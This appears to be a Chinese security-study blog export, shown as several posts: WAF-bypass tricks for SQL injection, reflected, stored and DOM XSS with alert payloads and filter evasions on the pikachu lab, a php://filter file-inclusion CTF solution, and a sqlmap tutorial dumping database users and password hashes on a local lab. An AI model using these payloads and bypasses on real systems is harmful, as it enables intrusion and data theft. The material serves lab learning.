<p>尝试修改关键词大小写方式绕过</p>
<p>如：And 1=1 或：aNd 1=1 或：anD 等等（任意字母大小写皆可ANd,aND and so on）</p>
<p>示例：</p>
<p>使用order by查询字段数量</p>
<p>页面被拦截</p>
<p>尝试同上方法修改order的部分字母大小写</p>
<p>可行的话即by没有被拦截</p>
<p>若也被拦截，就继续绕过</p>
<h3 id="双写绕过注入"><a href="#双写绕过注入" class="headerlink" title="双写绕过注入"></a>双写绕过注入</h3><p>从报错中的错误信息中发现，输入的and 1=1变成了1=1</p>
<p>由此可得，关键词and被过滤</p>
<p>尝试使用双写方式绕过</p>
<p>示例：anandd 1=1 或：aandnd 1=1 and so on</p>
<p>如若使用order by查询字段数量时，错误信息显示输入变成“der by”</p>
<p>即可发现order整个单词没有被过滤，仅仅是or被过滤了</p>
<p>此时只需要双写or即可</p>
<h3 id="编码绕过注入"><a href="#编码绕过注入" class="headerlink" title="编码绕过注入"></a>编码绕过注入</h3><p>示例：</p>
<p>访问id=1 and 1=1 或id=1 and 1=2 等等</p>
<p>页面被拦截，即有关键词被拦截</p>
<p>尝试使用url全编码的方式绕过</p>
<ul>
<li><input disabled="" type="checkbox"> 注意：url编码方式需选择全编码，而不是普通的url编码</li>
</ul>
<p>关键词and进行两次全编码结果：%25%36%31%25%36%65%25%36%34</p>
<p>即访问：id=1 %25%36%31%25%36%65%25%36%34 1=1</p>
<p>附：在网上难找到在线的url全编码工具，但是找到一个<a class="link"   href="https://blog.csdn.net/qq_31129545/article/details/101208047" >python脚本<i class="fas fa-external-link-alt"></i></a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    clearFlag = <span class="string">&quot;y&quot;</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> clearFlag == <span class="string">&quot;y&quot;</span> <span class="keyword">or</span> clearFlag == <span class="string">&quot;Y&quot;</span>:</span><br><span class="line">            os.system(<span class="string">&quot;cls&quot;</span>)</span><br><span class="line">        clearFlag = <span class="string">&quot;&quot;</span></span><br><span class="line">        string = <span class="built_in">input</span>(<span class="string">&quot;请输入需要转换的字符串 :&quot;</span>)</span><br><span class="line">        <span class="built_in">type</span> = <span class="built_in">input</span>(<span class="string">&quot;请选择操作类型(1：加密 2：解密) :&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span>(<span class="built_in">type</span> != <span class="string">&quot;1&quot;</span> <span class="keyword">and</span> <span class="built_in">type</span> != <span class="string">&quot;2&quot;</span>):</span><br><span class="line">            <span class="built_in">type</span> = <span class="built_in">input</span>(<span class="string">&quot;操作类型输入错误，请重新选择(1：加密 2：解密) :&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span> == <span class="string">&quot;1&quot;</span> :</span><br><span class="line">            encode_string = encode(string)</span><br><span class="line">            print(<span class="string">&quot;编码结果为：&quot;</span>+encode_string+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span> == <span class="string">&quot;2&quot;</span> :</span><br><span class="line">            decode_string = decode(string)</span><br><span class="line">            print(<span class="string">&quot;解码结果为：&quot;</span>+decode_string+<span class="string">&quot;【请注意前后空格】\n&quot;</span>)</span><br><span class="line">        clearFlag = <span class="built_in">input</span>(<span class="string">&quot;按Y/y清空屏幕继续:&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#编码</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">string</span>):</span></span><br><span class="line">    encode_string = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> string:</span><br><span class="line">        encode_char = <span class="built_in">hex</span>(<span class="built_in">ord</span>(char)).replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;%&quot;</span>)</span><br><span class="line">        encode_string += encode_char</span><br><span class="line">    <span class="keyword">return</span> encode_string</span><br><span class="line"></span><br><span class="line"><span class="comment">#解码</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">string</span>):</span></span><br><span class="line">    decode_string = <span class="string">&quot;&quot;</span></span><br><span class="line">    string_arr = string.split(<span class="string">&quot;%&quot;</span>)</span><br><span class="line">    string_arr.pop(<span class="number">0</span>)           <span class="comment">#删除第一个空元素</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> string_arr:</span><br><span class="line">        decode_char = <span class="built_in">chr</span>(<span class="built_in">eval</span>(<span class="string">&quot;0x&quot;</span>+char))</span><br><span class="line">        decode_string += decode_char</span><br><span class="line">    <span class="keyword">return</span> decode_string</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>

<h3 id="内联注释绕过"><a href="#内联注释绕过" class="headerlink" title="内联注释绕过"></a>内联注释绕过</h3><p>同样在关键词被绕过的情况下，可尝试使用内联注释绕过</p>
<p>访问</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="comment">/*!and*/</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>基础学习</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS-XSS基础</title>
    <url>/2021/XSS-XSS%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h1 id="XSS-XSS基础"><a href="#XSS-XSS基础" class="headerlink" title="XSS-XSS基础"></a>XSS-XSS基础</h1><p>跨站脚本</p>
<p>Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写”CSS”冲突，故又称XSS</p>
<h2 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h2><p>反射型XSS又称为非持久性XSS，该攻击一般具有一次性</p>
<h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h3><p>通过点子邮件等方式发送包含XSS代码的恶意链接</p>
<p>受害者访问该链接时，服务器接收请求并处理</p>
<p>带有XSS代码的数据被发送给浏览器</p>
<p>浏览器解析代码，触发XSS漏洞</p>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>pikachu漏洞练习平台-反射型XSS</p>
<p>输入攻击代码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&quot;BEACON&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br></pre></td></tr></table></figure>

<p>输入点限制了输入长度</p>
<p>代码审计修改最大长度</p>
<p>输入攻击代码，成功触发</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210330143524202.png"
                      alt="image-20210330143524202"
                ></p>
<h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><p>存储型XSS又成为持久型XSS，攻击脚本会被永久地存放在目标服务器的数据库或文件中，极具隐蔽性</p>
<h3 id="攻击方式-1"><a href="#攻击方式-1" class="headerlink" title="攻击方式"></a>攻击方式</h3><p>攻击多见于论坛、博客、留言板</p>
<p>攻击者将恶意脚本与正常信息一起注入帖子的内容</p>
<p>帖子被服务器储存，恶意脚本随之被储存</p>
<p>用户浏览被注入脚本的帖子，恶意脚本将会在其浏览器执行</p>
<h3 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h3><p>pikachu漏洞练习平台-存储型XSS</p>
<p>在留言板中输入攻击代码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210330150612406.png"
                      alt="image-20210330150612406"
                ></p>
<p>每进一次该页面，都会触发一次</p>
<h2 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h2><p>DOM全称“Document Object Model”</p>
<p>使用DOM能使程序和脚本能够动态地访问和更新文档的内容、结构和样式</p>
<p>其为一种特殊的反射型XSS，是基于DOM文档对象模型的一种漏洞</p>
<h3 id="攻击方式-2"><a href="#攻击方式-2" class="headerlink" title="攻击方式"></a>攻击方式</h3><p>用户请求一个经过专门设计的URL，它由攻击者提交，且其中包含XSS代码</p>
<p>服务器的响应不会以任何形式包含攻击者的脚本</p>
<p>当用户的浏览器处理这个响应时</p>
<p>DOM对象会处理XSS代码，导致存在XSS漏洞</p>
<h3 id="实例-2"><a href="#实例-2" class="headerlink" title="实例"></a>实例</h3><p>pikachu漏洞练习平台-DOM型XSS</p>
<p>查看源码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210330194018643.png"
                      alt="image-20210330194018643"
                ></p>
<p>根据提示构造闭合即可</p>
<p>构造如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#x27;&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onmouseover</span>=<span class="string">&quot;alert(&#x27;BEACON&#x27;)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>效果是使得鼠标移到左下角图片上时会有弹出</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210330194357604.png"
                      alt="image-20210330194357604"
                ></p>
<p>构造如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#x27; onclick=&quot;alert(&#x27;BEACON&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>效果是点击时会有弹出</p>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>XSS</tag>
        <tag>基础学习</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS-XSS进阶</title>
    <url>/2021/XSS-XSS%E8%BF%9B%E9%98%B6/</url>
    <content><![CDATA[<h1 id="XSS-XSS进阶"><a href="#XSS-XSS进阶" class="headerlink" title="XSS-XSS进阶"></a>XSS-XSS进阶</h1><p>XSS常用测试语句</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&quot;BEACON&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onmouseover</span>=<span class="string">&quot;alert(&#x27;BEACON&#x27;)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(&#x27;BEACON&#x27;)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(</span>&#x27;<span class="attr">BEACON</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alter(</span>&#x27;<span class="attr">BEACON</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure>

<p>onmouseover：鼠标指针移动到图片后执行代码</p>
<p>onerror：视频或音频数据加载期间发生错误时触发</p>
<p>onload：事件会在页面或图像加载完成后立即发生</p>
<h2 id="普通绕过"><a href="#普通绕过" class="headerlink" title="普通绕过"></a>普通绕过</h2><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>修改大小写，如果后台机制只匹配小写，则可绕过</p>
<h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><p>例如</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;scri<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">pt&gt;alert(<span class="string">&#x27;BEACON&#x27;</span>)&lt;/scri</span><span class="tag">&lt;/<span class="name">script</span>&gt;<span class="name">pt</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>后台如果只过滤一次script，则可绕过</p>
<h3 id="注释干扰"><a href="#注释干扰" class="headerlink" title="注释干扰"></a>注释干扰</h3><p>例如</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;scri<span class="comment">&lt;!--test--&gt;</span>pt&gt;alert(&#x27;BEACON&#x27;)&lt;/sc<span class="comment">&lt;!--test--&gt;</span>ript&gt;</span><br></pre></td></tr></table></figure>

<p>采用注释进行干扰</p>
<h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><h3 id="JS编码"><a href="#JS编码" class="headerlink" title="JS编码"></a>JS编码</h3><p>四种JS编码策略</p>
<blockquote>
<p>三个八进制数字，如个数不够，在前面补0，例如”e”的编码为”\145”</p>
<p>两个十六进制数字，如个数不够，前补0，例如”e”的编码为”\x65”</p>
<p>四个十六进制数字，如个数不够，前补0，例如”e”的编码为”\u0065”</p>
<p>对于一些控制字符，使用特殊的C类转义风格，例如\n或\r</p>
</blockquote>
<h3 id="HTML实体编码"><a href="#HTML实体编码" class="headerlink" title="HTML实体编码"></a>HTML实体编码</h3><blockquote>
<p>命名实体：以&amp;开头，以分号结尾，例如”&lt;”的编码是”&amp;lt”</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="symbol">&amp;lt;</span>img src=<span class="symbol">&amp;quot;</span>#<span class="symbol">&amp;quot;</span> onerror=<span class="symbol">&amp;quot;</span>alert(<span class="symbol">&amp;#39;</span>BEACON<span class="symbol">&amp;#39;</span>)<span class="symbol">&amp;quot;</span><span class="symbol">&amp;gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>字符编码：十进制、十六进制ASCII码或Unicode字符编码，样式为”&amp;#数值;”，例如”&lt;”可编码为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&amp;#060;</span><br><span class="line">或</span><br><span class="line">&amp;#x3c;</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h3><p>即两次URL全编码的结果</p>
<p>示例：alter进行两次URL全编码的结果为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%25%36%31%25%36%63%25%36%35%25%37%32%25%37%34</span><br></pre></td></tr></table></figure>

<p>这里附上URL全编码的python脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    clearFlag = <span class="string">&quot;y&quot;</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> clearFlag == <span class="string">&quot;y&quot;</span> <span class="keyword">or</span> clearFlag == <span class="string">&quot;Y&quot;</span>:</span><br><span class="line">            os.system(<span class="string">&quot;cls&quot;</span>)</span><br><span class="line">        clearFlag = <span class="string">&quot;&quot;</span></span><br><span class="line">        string = <span class="built_in">input</span>(<span class="string">&quot;请输入需要转换的字符串 :&quot;</span>)</span><br><span class="line">        <span class="built_in">type</span> = <span class="built_in">input</span>(<span class="string">&quot;请选择操作类型(1：加密 2：解密) :&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span>(<span class="built_in">type</span> != <span class="string">&quot;1&quot;</span> <span class="keyword">and</span> <span class="built_in">type</span> != <span class="string">&quot;2&quot;</span>):</span><br><span class="line">            <span class="built_in">type</span> = <span class="built_in">input</span>(<span class="string">&quot;操作类型输入错误，请重新选择(1：加密 2：解密) :&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span> == <span class="string">&quot;1&quot;</span> :</span><br><span class="line">            encode_string = encode(string)</span><br><span class="line">            print(<span class="string">&quot;编码结果为：&quot;</span>+encode_string+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span> == <span class="string">&quot;2&quot;</span> :</span><br><span class="line">            decode_string = decode(string)</span><br><span class="line">            print(<span class="string">&quot;解码结果为：&quot;</span>+decode_string+<span class="string">&quot;【请注意前后空格】\n&quot;</span>)</span><br><span class="line">        clearFlag = <span class="built_in">input</span>(<span class="string">&quot;按Y/y清空屏幕继续:&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#编码</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">string</span>):</span></span><br><span class="line">    encode_string = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> string:</span><br><span class="line">        encode_char = <span class="built_in">hex</span>(<span class="built_in">ord</span>(char)).replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;%&quot;</span>)</span><br><span class="line">        encode_string += encode_char</span><br><span class="line">    <span class="keyword">return</span> encode_string</span><br><span class="line"></span><br><span class="line"><span class="comment">#解码</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">string</span>):</span></span><br><span class="line">    decode_string = <span class="string">&quot;&quot;</span></span><br><span class="line">    string_arr = string.split(<span class="string">&quot;%&quot;</span>)</span><br><span class="line">    string_arr.pop(<span class="number">0</span>)           <span class="comment">#删除第一个空元素</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> string_arr:</span><br><span class="line">        decode_char = <span class="built_in">chr</span>(<span class="built_in">eval</span>(<span class="string">&quot;0x&quot;</span>+char))</span><br><span class="line">        decode_string += decode_char</span><br><span class="line">    <span class="keyword">return</span> decode_string</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>XSS</tag>
        <tag>基础学习</tag>
      </tags>
  </entry>
  <entry>
    <title>记一个简单的文件包含漏洞与PHP伪协议</title>
    <url>/2021/%E8%AE%B0%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8EPHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(strstr(<span class="variable">$file</span>,<span class="string">&quot;../&quot;</span>)||stristr(<span class="variable">$file</span>, <span class="string">&quot;tp&quot;</span>)||stristr(<span class="variable">$file</span>,<span class="string">&quot;input&quot;</span>)||stristr(<span class="variable">$file</span>,<span class="string">&quot;data&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Oh no!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>); </span><br><span class="line"><span class="comment">//flag放在了flag.php里</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>构造url:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;secr3t.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF-WEB</category>
      </categories>
      <tags>
        <tag>练习记录</tag>
        <tag>文件包含漏洞</tag>
        <tag>PHP伪协议</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL-sqlmap的使用</title>
    <url>/2021/SQL-sqlmap%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h1 id="SQL-sqlmap的使用"><a href="#SQL-sqlmap的使用" class="headerlink" title="SQL-sqlmap的使用"></a>SQL-sqlmap的使用</h1><p><a class="link"   href="https://sqlmap.campfire.ga/" >sqlmap用户手册中文版<i class="fas fa-external-link-alt"></i></a></p>
<h1 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h1><p>数据测试以本地自己搭建的sqli-labs靶场为例</p>
<h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><blockquote>
<p>以下选项可用于枚举后端 DBMS（Database Management System，数据库管理系统）信息、表结构和表中包含的数据。此外，你还可以运行自定义的SQL 语句。</p>
</blockquote>
<h3 id="获取全部数据"><a href="#获取全部数据" class="headerlink" title="获取全部数据"></a>获取全部数据</h3><blockquote>
<p>开关：<code>--all</code></p>
<p>当用户想要通过使用单个开关远程获取所有可访问数据信息，可以使用该开关。通常不建议这么做，因为它会产生大量的请求同时获取有用无用的数据。</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">\sqlmap<span class="operator">&gt;</span>python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">-</span>labs:<span class="number">8080</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--all</span></span><br></pre></td></tr></table></figure>

<p>测试了一下，该开关产生许多有用无用的数据，平常使用除非万不得已应该尽量少使用这个</p>
<h3 id="标语（Banner）"><a href="#标语（Banner）" class="headerlink" title="标语（Banner）"></a>标语（Banner）</h3><blockquote>
<p>开关：<code>-b</code> 或 <code>--banner</code></p>
<p>大多数现代 DBMS 具有一个函数和/或一个环境变量，它会返回 DBMS 版本，并最终在其补丁级别详细介绍底层系统。通常这个函数是 <code>version()</code> ，环境变量是 <code>@@version</code>，这取决于目标 DBMS。</p>
<p>针对 Oracle 目标的示例：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$ python sqlmap.py <span class="operator">-</span>u &quot;http://192.168.136.131/sqlmap/oracle/get_int.php?id=1&quot; <span class="operator">-</span>\<span class="operator">-</span>banner</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line">[xx:xx:<span class="number">11</span>] [INFO] fetching banner</span><br><span class="line">web application technology: PHP <span class="number">5.2</span><span class="number">.6</span>, Apache <span class="number">2.2</span><span class="number">.9</span></span><br><span class="line">back<span class="operator">-</span><span class="keyword">end</span> DBMS: Oracle</span><br><span class="line">banner:    <span class="string">&#x27;Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - Prod&#x27;</span></span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">\sqlmap<span class="operator">&gt;</span>python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">-</span>labs:<span class="number">8080</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--banner</span></span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210502210351444.png"
                      alt="image-20210502210351444"
                ></p>
<h3 id="当前会话用户"><a href="#当前会话用户" class="headerlink" title="当前会话用户"></a>当前会话用户</h3><blockquote>
<p>开关：<code>--current-user</code></p>
<p>使用此开关，可以从 Web 应用程序中获取到当前正在执行相关数据库查询操作的 DBMS 用户。</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">\sqlmap<span class="operator">&gt;</span>python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">-</span>labs:<span class="number">8080</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--current-user</span></span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210502210520463.png"
                      alt="image-20210502210520463"
                ></p>
<h3 id="当前数据库"><a href="#当前数据库" class="headerlink" title="当前数据库"></a>当前数据库</h3><blockquote>
<p>开关：<code>--current-db</code></p>
<p>使用此开关可以获取 Web 应用程序连接到的 DBMS 数据库名称。</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">\sqlmap<span class="operator">&gt;</span>python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">-</span>labs:<span class="number">8080</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--current-db</span></span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210502210712654.png"
                      alt="image-20210502210712654"
                ></p>
<h3 id="服务器主机名"><a href="#服务器主机名" class="headerlink" title="服务器主机名"></a>服务器主机名</h3><blockquote>
<p>开关：<code>--hostname</code></p>
<p>使用此开关可以获取 DBMS 所在的主机名。</p>
<p>针对 MySQL 目标的示例：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$ python sqlmap.py <span class="operator">-</span>u &quot;http://192.168.136.131/sqlmap/mysql/get_int.php?id=1&quot; <span class="comment">--\hostname</span></span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line">[xx:xx:<span class="number">04</span>] [INFO] fetching server hostname</span><br><span class="line">[xx:xx:<span class="number">04</span>] [INFO] retrieved: debian<span class="number">-5.0</span><span class="operator">-</span>i386</span><br><span class="line">hostname:    <span class="string">&#x27;debian-5.0-i386&#x27;</span></span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">\sqlmap<span class="operator">&gt;</span>python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">-</span>labs:<span class="number">8080</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--hostname</span></span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210502210855110.png"
                      alt="image-20210502210855110"
                ></p>
<h3 id="检测当前会话用户是否为数据库管理员"><a href="#检测当前会话用户是否为数据库管理员" class="headerlink" title="检测当前会话用户是否为数据库管理员"></a>检测当前会话用户是否为数据库管理员</h3><blockquote>
<p>开关：<code>--is-dba</code></p>
<p>可以检测当前 DBMS 会话用户是否为数据库管理员，也称为 DBA。如果是，sqlmap 将返回 <code>True</code>，否则返回 <code>False</code>。</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">\sqlmap<span class="operator">&gt;</span>python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">-</span>labs:<span class="number">8080</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--is-dba</span></span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210502211024399.png"
                      alt="image-20210502211024399"
                ></p>
<h3 id="列出-DBMS-所有用户"><a href="#列出-DBMS-所有用户" class="headerlink" title="列出 DBMS 所有用户"></a>列出 DBMS 所有用户</h3><blockquote>
<p>开关：<code>--users</code></p>
<p>如果当前会话用户对包含 DBMS 用户信息的系统表有读取权限，可以枚举用户列表。</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">\sqlmap<span class="operator">&gt;</span>python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">-</span>labs:<span class="number">8080</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--users</span></span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/image-20210502211210814.png"
                      alt="image-20210502211210814"
                ></p>
<h3 id="列出和破解-DBMS-用户的密码哈希"><a href="#列出和破解-DBMS-用户的密码哈希" class="headerlink" title="列出和破解 DBMS 用户的密码哈希"></a>列出和破解 DBMS 用户的密码哈希</h3><blockquote>
<p>开关：<code>--passwords</code></p>
<p>如果当前会话用户对包含 DBMS 用户密码信息的系统表有读取权限，则可以枚举每个 DBMS 用户的密码哈希值。sqlmap 将会枚举所有用户，及一一对应的用户密码哈希。</p>
<p>针对 PostgreSQL 目标的示例：</p>
